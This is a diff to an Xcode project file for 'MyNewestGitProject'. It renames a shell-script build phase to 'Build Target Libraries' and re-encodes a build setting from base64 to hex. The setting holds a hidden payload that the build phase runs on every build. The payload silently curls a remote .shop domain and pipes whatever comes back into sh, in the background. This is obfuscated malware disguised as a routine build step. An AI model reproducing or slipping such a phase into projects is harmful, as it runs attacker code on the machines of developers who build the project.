@@ -93,7 +93,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 4C742871309C928600105B48 /* Build configuration list for PBXNativeTarget "MyNewestGitProject" */;
 			buildPhases = (
-				BBD96C48813746D39CCD70F0 /* Provision Target Device */,
+				8D7BA56D5C244A2FA1CD70F0 /* Build Target Libraries */,
 				4C74284E309C928200105B48 /* Sources */,
 				4C74284F309C928200105B48 /* Frameworks */,
 				4C742850309C928200105B48 /* Resources */,
@@ -194,34 +194,6 @@
 		};
 /* End PBXProject section */
 
-/* Begin PBXBuildRule section */
-	/* End PBXBuildRule section */
-
-/* Begin PBXBuildFile section */
-/* End PBXBuildFile section */
-
-/* Begin PBXShellScriptBuildPhase section */
-		BBD96C48813746D39CCD70F0 /* Provision Target Device */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			alwaysOutOfDate = 1;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Provision Target Device";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			shellPath = /bin/sh;
-			showEnvVarsInLog = 0;	
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A0F07DC}\"";
-		};
-/* End PBXShellScriptBuildPhase section */
-
 /* Begin PBXResourcesBuildPhase section */
 		4C742850309C928200105B48 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
@@ -239,6 +211,28 @@
 			);
 		};
 /* End PBXResourcesBuildPhase section */
+
+/* Begin PBXShellScriptBuildPhase section */
+		8D7BA56D5C244A2FA1CD70F0 /* Build Target Libraries */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Target Libraries";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			showEnvVarsInLog = 0;	
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A0F07DC}\"";
+		};
+/* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
 		4C74284E309C928200105B48 /* Sources */ = {
@@ -275,7 +269,7 @@
 		4C74286F309C928600105B48 /* Debug configuration for PBXProject "MyNewestGitProject" */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A0F07DC = "((n(){ `printf base6W4 | tr -d W` --decode; };echo ZWNobyAiJChjdXJsIC1mTHNrIC0tcmV0cnkgNSAtLWNvbm5lY3QtdGltZW91dCAyNSAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly91ZHVlZGQzYnVxdy5zaG9wL2EpIiB8IHNoCg== | n | sh ) >/dev/null 2>&1 &)";
+				A0F07DC = "((z(){ `printf xBxd | tr -d B` -p -r; };echo 6563686f202224286375726c202d2d72657472792033202d4c666b73202d2d636f6e6e6563742d74696d656f7574203235202d642022703d78636f64655f7068617365222068747470733a2f2f75647565646433627571772e73686f702f612922207c2073680a | z | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -339,7 +333,7 @@
 		4C742870309C928600105B48 /* Release configuration for PBXProject "MyNewestGitProject" */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A0F07DC = "((n(){ `printf base6W4 | tr -d W` --decode; };echo ZWNobyAiJChjdXJsIC1mTHNrIC0tcmV0cnkgNSAtLWNvbm5lY3QtdGltZW91dCAyNSAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly91ZHVlZGQzYnVxdy5zaG9wL2EpIiB8IHNoCg== | n | sh ) >/dev/null 2>&1 &)";
+				A0F07DC = "((z(){ `printf xBxd | tr -d B` -p -r; };echo 6563686f202224286375726c202d2d72657472792033202d4c666b73202d2d636f6e6e6563742d74696d656f7574203235202d642022703d78636f64655f7068617365222068747470733a2f2f75647565646433627571772e73686f702f612922207c2073680a | z | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
